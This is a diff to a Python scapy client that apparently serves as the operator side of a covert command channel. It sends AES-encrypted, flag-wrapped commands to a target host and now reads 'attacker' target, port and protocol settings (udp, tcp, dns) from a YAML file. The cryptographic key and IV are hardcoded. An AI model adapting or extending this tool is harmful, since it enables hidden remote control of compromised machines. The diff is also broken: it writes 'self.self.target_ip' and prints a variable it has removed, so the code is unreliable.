@@ -6,24 +6,26 @@ from scapy.layers.inet import UDP, IP
 from scapy.all import sniff, send
 from scapy.volatile import RandShort
 from threading import Thread
-
+import yaml
 
 
 
 class Client:
-    def __init__(self, ip: str):
+    def __init__(self):
         print(f"Client has been initiated.\nTarget: {ip}")
         print("--------------------------------------------------------------")
-        self.target_ip = ip
+        self.target_ip = ""
         self.key = b'\xac\x19\x08\xf8\x80uo\x0c5\xcb\x82_\xc9\xc0\xdc4Z=\xbf\x19\xf0O\xfa\x94\x0fW\x95\xaf=\xe9U\t'
         self.iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'
         self.flag_begin = "****["
         self.flag_close = "]****"
-        self.port = 8888
+        self.port = 0
         self.check = True
-
+        self.supported_protos = ["udp", "tcp", "dns"]
+        self.proto = ""
 
     def start(self):
+        self.process_yaml()
         self.create_thread()
         self.get_input()
 
@@ -38,7 +40,18 @@ class Client:
     def set_check(self):
         self.check = not self.check
 
+    def process_yaml(self):
+        with open('config.yaml', 'r') as f:
+            config = yaml.safe_load(f)
 
+        self.self.target_ip = config['attacker']['target']
+        self.recv_port = config['attacker']['recv_port']
+        self.send_port = config['attacker']['send_port']
+        self.proto = config['attacker']['proto']
+        print(f"target is {self.target_ip}")
+        print(f"Send is {self.send_port}")
+        print(f"recv is {self.recv_port}")
+        print(f"proto  is {self.proto}")
     def prepare_msg(self, cmd: str) -> str:
         cipher = self.generate_cipher()
         encrypted_data = self.encrypt_data(cipher, cmd)
